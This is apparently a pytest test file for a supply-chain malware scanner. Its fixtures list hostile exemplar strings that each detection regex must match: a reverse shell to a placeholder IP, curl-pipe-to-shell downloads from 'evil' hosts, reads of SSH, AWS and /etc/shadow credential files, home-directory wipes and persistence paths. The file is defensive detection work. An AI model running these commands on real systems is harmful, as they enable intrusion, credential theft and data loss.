"""
Tests for the pattern engine (scan_text) in the canonical v2.4 module.

We test:
  - A clean string returns no findings.
  - Every entry in MALICIOUS_PATTERNS triggers itself (catches typos in the
    regex that would silently never match).
  - The dedup-by-(desc, risk) rule works.
  - The ASCII-only unicode-escape pattern doesn't fire on legitimate i18n.
  - The risk_level strings are exactly the canonical values.

Adding a pattern? Add a matching entry to EXEMPLARS below, or
test_each_pattern_has_an_exemplar fails (intentional — a pattern must ship
with a self-detection check).
"""
from __future__ import annotations

import re

import pytest

CANONICAL_LEVELS = {"CRITICAL", "HIGH", "MEDIUM", "LOW"}


# ─── Clean input ──────────────────────────────────────────────────────────────

@pytest.mark.parametrize("clean_text", [
    "",
    "function add(a, b) { return a + b; }",
    "// just a comment\nmodule.exports = require('lodash');",
    "import sys\nprint('hello world')",
    "name: ci\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest",
])
def test_clean_text_returns_no_findings(guard, clean_text):
    assert guard.scan_text(clean_text) == []


# ─── Risk-level vocabulary is exactly the canonical set ───────────────────────

def test_risk_levels_are_canonical(guard):
    levels = {risk for _, _, risk in guard.MALICIOUS_PATTERNS}
    assert levels.issubset(CANONICAL_LEVELS), (
        f"Unexpected risk-level string(s): {levels - CANONICAL_LEVELS}. "
        "Allowed: CRITICAL/HIGH/MEDIUM/LOW (see CLAUDE.md §4.2)."
    )


# ─── Every pattern can detect its own marker ──────────────────────────────────
# Keyed by the exact `desc` string in MALICIOUS_PATTERNS. Each value is a string
# the corresponding regex must match (case-insensitive).

EXEMPLARS = {
    "Worm identity string":                        "// Shai-Hulud was here",
    "Worm campaign tag":                           "label = 'Here We Go Again'",
    "Known threat actor marker":                   "actor = 'TeamPCP'",
    "Persistent token-monitor daemon name":        "service: gh-token-monitor",
    "Worm repo description tag":                    "A Mini Shai-Hulud has Appeared",
    "Linux/macOS home-directory wipe":             "exec('rm -rf ~')",
    "Windows home-directory wipe":                 "rmdir /s /q %USERPROFILE%\\stuff",
    "Known C2 typosquat domain":                   "url = 'https://git-tanstack.com/x'",
    "Known exfiltration endpoint (webhook.site)":  "post('webhook.site/12345678-90ab-cdef-1234-567890abcdef')",
    "Session network (C2 exfiltration channel)":   "host = 'getsession.org'",
    "GCP credential file access":                  "read('application_default_credentials.json')",
    "AWS credential file path referenced":         "open('~/.aws/credentials')",
    "AWS credentials in HTTP request context (exfiltration signal)":
                                                    "body=AWS_SECRET_ACCESS_KEY; fetch('http://evil')",
    "Azure credential access":                     "AZURE_CLIENT_SECRET=xyz",
    "SSH key file path access (.ssh/ prefix)":     "open('~/.ssh/id_rsa')",
    ".npmrc credential file read":                 "readFile('~/.npmrc')",
    "GitHub PAT literal in code":                  "TOKEN = 'ghp_" + "a" * 36 + "'",
    "GitHub OAuth token literal":                  "TOKEN = 'gho_" + "a" * 36 + "'",
    "npm token literal":                           "TOKEN = 'npm_" + "a" * 36 + "'",
    "Bun runtime installer in lifecycle script":   "curl https://bun.sh/install | bash",
    "Bun used to execute payload":                 "spawn('bun', ['run', './x.js'])",
    "CI runner memory extraction":                 "open('/proc/1234/mem')",
    "GitHub OIDC token ENV var access":            "env.ACTIONS_ID_TOKEN_REQUEST_URL",
    "OIDC id-token scope in config":               "id-token: write",
    "macOS LaunchAgent persistence":               "~/Library/LaunchAgents/com.user.gh-token-monitor.plist",
    "Linux systemd user service persistence":      "~/.config/systemd/user/foo.service",
    "Windows Task Scheduler persistence":          "SCHTASKS /create /tn evil",
    "Base64-encoded payload literal (obfuscation signal)":
                                                    "atob('" + "QQQQ" * 12 + "')",
    "eval of decoded content":                     "eval(atob('cGF5bG9hZA=='))",
    "ASCII chars encoded as \\u escapes (obfuscation)":
                                                    "x = '\\u0065\\u0076\\u0061\\u006C'",
    "GitHub API repo creation (credential dump)":  "fetch('https://api.github.com/user/repos')",
    "Authenticated GitHub API call (auth header construction)":
                                                    "headers = {'Authorization': 'Bearer $TOKEN'}",
    "pull_request_target trigger (only dangerous with cache — see CHECK 6)":
                                                    "on: pull_request_target",
    "Cache restore with broad key (potential poison)":
                                                    "actions/cache restore-keys: deps-",
    "Reverse shell command":                       "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
    "Silent file download (exfiltration signal)":  "curl -sS http://evil.example/x",
    "System credential file access":               "open('/etc/shadow')",
    ".env file access":                            "fs.readFileSync('.env')",
    "Shell exec with string literal":              "exec('curl http://evil')",
    "Subprocess spawning network downloader in package":
                                                    "subprocess.run(['curl', 'http://evil/x'])",
    "Subprocess spawning shell with download/pipe/remote payload":
                                                    "subprocess.run(['bash', '-c', 'curl http://evil | sh'])",
    "Subprocess spawning shell interpreter in package (build step?)":
                                                    "subprocess.check_call(['sh', './autogen.sh'])",
    "os.system with dangerous command in setup":   "os.system('curl http://evil | sh')",
    "Dynamic os import (obfuscation pattern)":      "mod = __import__('os')",
    "atexit hook registered (check if in setup/install script)":
                                                    "atexit.register(cleanup)",
    "Custom setup cmdclass override (setup.py lifecycle hook)":
                                                    "setup(cmdclass={'build': X})",
    ".pth file with code injection":               "evil.pth: import os; os.system('x')",
}


def _check_self_detection(module, exemplars):
    """Each pattern in module.MALICIOUS_PATTERNS detects its own exemplar."""
    missing = []
    not_found = []
    for pattern, desc, _risk in module.MALICIOUS_PATTERNS:
        exemplar = exemplars.get(desc)
        if exemplar is None:
            missing.append(desc)
            continue
        if not re.search(pattern, exemplar, re.IGNORECASE):
            not_found.append((desc, pattern, exemplar))
    return missing, not_found


def test_each_pattern_has_an_exemplar(guard):
    missing, _ = _check_self_detection(guard, EXEMPLARS)
    assert not missing, (
        "These pattern descriptions have no exemplar in tests/test_patterns.py — "
        "add one when adding a pattern:\n  " + "\n  ".join(missing)
    )


def test_every_pattern_matches_its_exemplar(guard):
    _, not_found = _check_self_detection(guard, EXEMPLARS)
    assert not not_found, (
        "Some patterns failed to match their own exemplar — regex typo?\n"
        + "\n".join(f"  desc={d!r} pattern={p!r} exemplar={e!r}" for d, p, e in not_found)
    )


# ─── Subprocess intent split (matplotlib calibration regression guard) ────────
# setupext.py runs `subprocess.check_call(["sh", "./autogen.sh"])` — a legit
# native-extension build. It must surface as MEDIUM, never HIGH; the real
# download-pipe-execute TTP must stay HIGH. See docs/DESIGN.md § 2.9.

def test_bare_build_shell_is_medium_not_high(guard):
    hits = guard.scan_text('subprocess.check_call(["sh", "./autogen.sh"], cwd=src)')
    shell = [(d, r) for d, r, _ in hits if d.startswith("Subprocess spawning shell")]
    assert shell, "a bare build-shell should still surface a finding"
    assert all(r == "MEDIUM" for _, r in shell), f"build shell must be MEDIUM, got {shell}"


def test_download_pipe_shell_is_high(guard):
    hits = guard.scan_text('subprocess.run(["bash", "-c", "curl http://evil | sh"])')
    assert any(r == "HIGH" for d, r, _ in hits), f"download-pipe shell must be HIGH: {hits}"


def test_subprocess_curl_downloader_is_high(guard):
    hits = guard.scan_text('subprocess.run(["curl", "https://evil/x", "-o", "p"])')
    assert any(r == "HIGH" and "downloader" in d for d, r, _ in hits), \
        f"curl downloader must be HIGH: {hits}"


# ─── Dedup-by-(desc, risk) ────────────────────────────────────────────────────

def test_dedup_by_desc_risk(guard):
    """Multiple matches of the same pattern collapse to one finding."""
    s = "Shai-Hulud\nShai-Hulud\nShai-Hulud"  # three occurrences
    hits = guard.scan_text(s)
    worm_hits = [h for h in hits if "Worm identity" in h[0]]
    assert len(worm_hits) == 1


# ─── ASCII-scoped unicode-escape pattern: regression guard for CLAUDE.md §5.6 ─

def test_ascii_unicode_escapes_match(guard):
    """ASCII-range \\u escapes (worm obfuscation pattern) ARE detected."""
    ascii_obf = "var x = '\\u0065\\u0076\\u0061\\u006C';"  # encodes "eval"
    descs = [d for d, _, _ in guard.scan_text(ascii_obf)]
    assert any("\\u escapes" in d for d in descs)


def test_high_codepoint_unicode_escapes_DO_NOT_match(guard):
    """Legitimate i18n high-codepoint escapes are NOT flagged."""
    i18n = "var t = '\\u01A0\\u01A1\\u01B2\\u01C3\\u01D4\\u01E5';"
    descs = [d for d, _, _ in guard.scan_text(i18n)]
    assert not any("\\u escapes" in d for d in descs), (
        f"High-codepoint escapes triggered the unicode-escape pattern — "
        f"this regresses CLAUDE.md §5.6. Hits: {descs}"
    )
